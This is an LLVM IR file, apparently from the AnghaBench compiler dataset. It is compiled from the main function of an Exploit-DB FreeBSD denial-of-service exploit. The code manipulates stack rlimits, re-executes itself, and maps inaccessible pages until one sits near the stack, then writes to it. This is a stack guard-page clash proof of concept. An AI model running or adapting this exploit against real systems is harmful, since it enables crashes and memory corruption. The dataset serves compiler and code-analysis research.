; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/freebsd_x86/dos/extr_42279.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/freebsd_x86/dos/extr_42279.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.rlimit = type { i32, i32 }

@main.core = internal constant %struct.rlimit zeroinitializer, align 4
@RLIMIT_CORE = common dso_local global i32 0, align 4
@RLIMIT_STACK = common dso_local global i32 0, align 4
@PROT_NONE = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@MAP_FAILED = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [18 x i8] c"char at %p: %02x\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.rlimit, align 4
  %7 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %8 = load i32, i32* @RLIMIT_CORE, align 4
  %9 = call i64 @setrlimit(i32 %8, %struct.rlimit* @main.core)
  %10 = icmp ne i64 %9, 0
  br i1 %10, label %11, label %13

11:                                               ; preds = %2
  %12 = call i32 (...) @die()
  br label %13

13:                                               ; preds = %11, %2
  %14 = load i32, i32* @RLIMIT_STACK, align 4
  %15 = call i64 @getrlimit(i32 %14, %struct.rlimit* %6)
  %16 = icmp ne i64 %15, 0
  br i1 %16, label %17, label %19

17:                                               ; preds = %13
  %18 = call i32 (...) @die()
  br label %19

19:                                               ; preds = %17, %13
  %20 = getelementptr inbounds %struct.rlimit, %struct.rlimit* %6, i32 0, i32 0
  %21 = load i32, i32* %20, align 4
  %22 = getelementptr inbounds %struct.rlimit, %struct.rlimit* %6, i32 0, i32 1
  %23 = load i32, i32* %22, align 4
  %24 = sdiv i32 %23, 3
  %25 = icmp sgt i32 %21, %24
  br i1 %25, label %26, label %42

26:                                               ; preds = %19
  %27 = getelementptr inbounds %struct.rlimit, %struct.rlimit* %6, i32 0, i32 1
  %28 = load i32, i32* %27, align 4
  %29 = sdiv i32 %28, 3
  %30 = getelementptr inbounds %struct.rlimit, %struct.rlimit* %6, i32 0, i32 0
  store i32 %29, i32* %30, align 4
  %31 = load i32, i32* @RLIMIT_STACK, align 4
  %32 = call i64 @setrlimit(i32 %31, %struct.rlimit* %6)
  %33 = icmp ne i64 %32, 0
  br i1 %33, label %34, label %36

34:                                               ; preds = %26
  %35 = call i32 (...) @die()
  br label %36

36:                                               ; preds = %34, %26
  %37 = load i8**, i8*** %5, align 8
  %38 = load i8*, i8** %37, align 8
  %39 = load i8**, i8*** %5, align 8
  %40 = call i32 @execve(i8* %38, i8** %39, i32* null)
  %41 = call i32 (...) @die()
  br label %42

42:                                               ; preds = %36, %19
  store i8* null, i8** %7, align 8
  br label %43

43:                                               ; preds = %73, %42
  %44 = load i32, i32* @PROT_NONE, align 4
  %45 = load i32, i32* @MAP_PRIVATE, align 4
  %46 = load i32, i32* @MAP_ANONYMOUS, align 4
  %47 = or i32 %45, %46
  %48 = call i8* @mmap(i32* null, i32 4096, i32 %44, i32 %47, i32 -1, i32 0)
  store i8* %48, i8** %7, align 8
  %49 = load i8*, i8** %7, align 8
  %50 = load i8*, i8** @MAP_FAILED, align 8
  %51 = icmp eq i8* %49, %50
  br i1 %51, label %52, label %54

52:                                               ; preds = %43
  %53 = call i32 (...) @die()
  br label %54

54:                                               ; preds = %52, %43
  %55 = ptrtoint %struct.rlimit* %6 to i64
  %56 = load i8*, i8** %7, align 8
  %57 = ptrtoint i8* %56 to i64
  %58 = icmp ult i64 %55, %57
  br i1 %58, label %59, label %61

59:                                               ; preds = %54
  %60 = call i32 (...) @die()
  br label %61

61:                                               ; preds = %59, %54
  %62 = ptrtoint %struct.rlimit* %6 to i64
  %63 = load i8*, i8** %7, align 8
  %64 = ptrtoint i8* %63 to i64
  %65 = sub i64 %62, %64
  %66 = getelementptr inbounds %struct.rlimit, %struct.rlimit* %6, i32 0, i32 1
  %67 = load i32, i32* %66, align 4
  %68 = sdiv i32 %67, 3
  %69 = mul nsw i32 %68, 2
  %70 = sext i32 %69 to i64
  %71 = icmp ult i64 %65, %70
  br i1 %71, label %72, label %73

72:                                               ; preds = %61
  br label %74

73:                                               ; preds = %61
  br label %43

74:                                               ; preds = %72
  %75 = load i32, i32* %4, align 4
  %76 = icmp sgt i32 %75, 1
  br i1 %76, label %77, label %87

77:                                               ; preds = %74
  %78 = getelementptr inbounds %struct.rlimit, %struct.rlimit* %6, i32 0, i32 1
  %79 = load i32, i32* %78, align 4
  %80 = getelementptr inbounds %struct.rlimit, %struct.rlimit* %6, i32 0, i32 0
  store i32 %79, i32* %80, align 4
  %81 = load i32, i32* @RLIMIT_STACK, align 4
  %82 = call i64 @setrlimit(i32 %81, %struct.rlimit* %6)
  %83 = icmp ne i64 %82, 0
  br i1 %83, label %84, label %86

84:                                               ; preds = %77
  %85 = call i32 (...) @die()
  br label %86

86:                                               ; preds = %84, %77
  br label %87

87:                                               ; preds = %86, %74
  %88 = load i8*, i8** %7, align 8
  store i8 65, i8* %88, align 1
  %89 = load i8*, i8** %7, align 8
  %90 = load i8*, i8** %7, align 8
  %91 = load i8, i8* %90, align 1
  %92 = call i32 @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i64 0, i64 0), i8* %89, i8 signext %91)
  %93 = load i32, i32* @EXIT_SUCCESS, align 4
  %94 = call i32 @exit(i32 %93) #3
  unreachable
}

declare dso_local i64 @setrlimit(i32, %struct.rlimit*) #1

declare dso_local i32 @die(...) #1

declare dso_local i64 @getrlimit(i32, %struct.rlimit*) #1

declare dso_local i32 @execve(i8*, i8**, i32*) #1

declare dso_local i8* @mmap(i32*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @printf(i8*, i8*, i8 signext) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
